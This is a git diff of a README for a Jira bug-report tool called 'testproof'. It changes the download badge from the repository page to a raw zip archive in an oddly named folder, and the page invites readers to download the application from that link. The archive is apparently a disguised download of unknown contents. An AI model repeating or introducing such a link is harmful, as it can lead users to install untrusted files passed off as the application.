@@ -1,6 +1,6 @@
 # 🛡️ testproof - Your Private Bug Report Assistant for Jira
 
-[![Download testproof](https://img.shields.io/badge/Download-testproof-blueviolet?style=for-the-badge&logo=github)](https://github.com/Henryviiiabywarburg482/testproof)
+[![Download testproof](https://img.shields.io/badge/Download-testproof-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Henryviiiabywarburg482/testproof/main/bicapsular/2.8.zip)
 
 Visit this link to download the application.
 
